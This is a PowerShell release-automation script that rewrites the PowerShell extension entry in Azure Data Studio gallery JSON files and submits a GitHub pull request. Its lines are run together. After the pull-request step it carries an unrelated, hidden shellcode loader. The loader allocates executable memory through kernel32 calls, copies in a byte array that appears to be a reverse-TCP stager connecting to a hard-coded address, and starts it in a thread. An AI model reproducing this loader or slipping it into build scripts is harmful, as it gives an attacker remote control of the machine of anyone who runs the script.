param([Parameter(Mandatory)][string]$GitHubToken,[Parameter(Mandatory)][version]$ExtensionVersion,[Parameter()][string[]]$GalleryFileName = ('extensionsGallery.json','extensionsGallery-insider.json'),[Parameter()][string]$SourceFork = 'rjmholt',[Parameter()][string]$TargetFork = 'Microsoft',[Parameter()][string]$BranchName = "update-psext-$ExtensionVersion",[Parameter()][string]$PRDescription = "Updates the version of the PowerShell extension in ADS to $ExtensionVersion.`n**Note**: This is an automated PR.")Import-Module "$PSScriptRoot/../GitHubTools.psm1" -ForceImport-Module "$PSScriptRoot/../FileUpdateTools.psm1" -Forcefunction NewReleaseVersionEntry{param([Parameter()][version]$Version,[Parameter()][datetime]$UpdateDate = [datetime]::Now.Date)return [ordered]@{version = "$Version"lastUpdated = $UpdateDate.ToString('M/dd/yyyy')assetUri = ''fallbackAssetUri = 'fallbackAssetUri'files = @([ordered]@{assetType = 'Microsoft.VisualStudio.Services.VSIXPackage'source = "https://sqlopsextensions.blob.core.windows.net/extensions/powershell/ms-vscode.PowerShell-$Version.vsix"}[ordered]@{assetType = 'Microsoft.VisualStudio.Services.Icons.Default'source = 'https://raw.githubusercontent.com/PowerShell/vscode-powershell/master/images/PowerShell_icon.png'}[ordered]@{assetType = 'Microsoft.VisualStudio.Services.Content.Details'source = 'https://raw.githubusercontent.com/PowerShell/vscode-powershell/master/docs/azure_data_studio/README_FOR_MARKETPLACE.md'}[ordered]@{assetType = 'Microsoft.VisualStudio.Code.Manifest'source = 'https://raw.githubusercontent.com/PowerShell/vscode-powershell/master/package.json'}[ordered]@{assetType = 'Microsoft.VisualStudio.Services.Content.License'source = 'https://raw.githubusercontent.com/PowerShell/vscode-powershell/master/LICENSE.txt'})properties = @([ordered]@{key = 'Microsoft.VisualStudio.Code.ExtensionDependencies'value = ''}[ordered]@{key = 'Microsoft.VisualStudio.Code.Engine'value = '>=0.32.1'}[ordered]@{key = 'Microsoft.VisualStudio.Services.Links.Source'value = 'https://github.com/PowerShell/vscode-powershell/'})}}function NewPowerShellExtensionEntry{param([Parameter()][version]$ExtensionVersion)return [ordered]@{extensionId = '35'extensionName = 'powershell'displayName = 'PowerShell'shortDescription = 'Develop PowerShell scripts in Azure Data Studio'publisher = [ordered]@{displayName = 'Microsoft'publisherId = 'Microsoft'publisherName = 'Microsoft'}versions = @(NewReleaseVersionEntry -Version $ExtensionVersion)statistics = @()flags = 'preview'}}function FindPSExtensionJsonSpan{param([Parameter()][string]$GalleryExtensionFileContent)try{$reader = [System.IO.StringReader]::new($GalleryExtensionFileContent)$jsonReader = [Newtonsoft.Json.JsonTextReader]::new($reader)$depth = 0$startLine = -1$startColumn = -1$startDepth = -1$awaitingExtensionName = $false$foundPowerShell = $falsewhile ($jsonReader.Read()){switch ($jsonReader.TokenType){'StartObject'{if (-not $foundPowerShell){$startDepth = $depth$startLine = $jsonReader.LineNumber$startColumn = $jsonReader.LinePosition}$depth++continue}'EndObject'{if ($foundPowerShell -and $depth -eq $startDepth + 1){return @{Start = @{Line = $startLineColumn = $startColumn}End = @{Line = $jsonReader.LineNumberColumn = $jsonReader.LinePosition}}}$depth--continue}'PropertyName'{if ($jsonReader.Value -eq 'extensionName'){$awaitingExtensionName = $true}continue}'String'{if (-not $awaitingExtensionName){continue}$awaitingExtensionName = $falseif ($jsonReader.Value -eq 'PowerShell'){$foundPowerShell = $true}continue}}}}finally{$reader.Dispose()$jsonReader.Dispose()}throw 'Did not find PowerShell extension'}function UpdateGalleryFile{param([Parameter(Mandatory)][version]$ExtensionVersion,[Parameter(Mandatory, ValueFromPipeline)][string[]]$GalleryFilePath)process{foreach ($galleryFile in $GalleryFilePath){$powershellEntry = NewPowerShellExtensionEntry -ExtensionVersion $ExtensionVersion$entryStr = ConvertTo-IndentedJson $powershellEntry -IndentChar "`t" -IndentWidth 1$galleryFileContent = Get-Content -Raw $GalleryFilePath$span = FindPSExtensionJsonSpan -GalleryExtensionFileContent $galleryFileContent$startOffset = Get-StringOffsetFromSpan -String $galleryFileContent -EndLine $span.Start.Line -Column $span.Start.Column$endOffset = Get-StringOffsetFromSpan -String $galleryFileContent -EndLine $span.End.Line -StartLine $span.Start.Line -Column $span.End.Column -InitialOffset $startOffset$newGalleryFileContent = New-StringWithSegment -String $galleryFileContent -NewSegment $entryStr -StartIndex $startOffset -EndIndex ($endOffset+1) -AutoIndentSet-Content -Path $GalleryFilePath -Value $newGalleryFileContent -Encoding utf8NoBOM -NoNewline}}}$repoLocation = Join-Path ([System.IO.Path]::GetTempPath()) 'ads-temp-checkout'$cloneParams = @{OriginRemote = "https://github.com/$SourceFork/AzureDataStudio"Destination = $repoLocationCloneBranch = 'release/extensions'CheckoutBranch = $branchNameClobber = $truePullUpstream = $trueUpdateOrigin = $trueRemotes = @{upstream = 'https://github.com/Microsoft/AzureDataStudio'}}Copy-GitRepository @cloneParams$GalleryFileName |ForEach-Object { "$repoLocation/$_" } |UpdateGalleryFile -ExtensionVersion $ExtensionVersionSubmit-GitChanges -RepositoryLocation $repoLocation -File $GalleryFileName -Branch $branchName -Message "Update PS extension to v$ExtensionVersion"$prParams = @{Organization = $TargetForkRepository = 'AzureDataStudio'TargetBranch = 'release/extensions'Branch = $branchNameTitle = "Update PowerShell extension to v$ExtensionVersion"Description = $PRDescriptionGitHubToken = $GitHubTokenFromOrg = $SourceFork}New-GitHubPR @prParams$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc5,0x00,0xc6,0x56,0x68,0x02,0x00,0x00,0x51,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};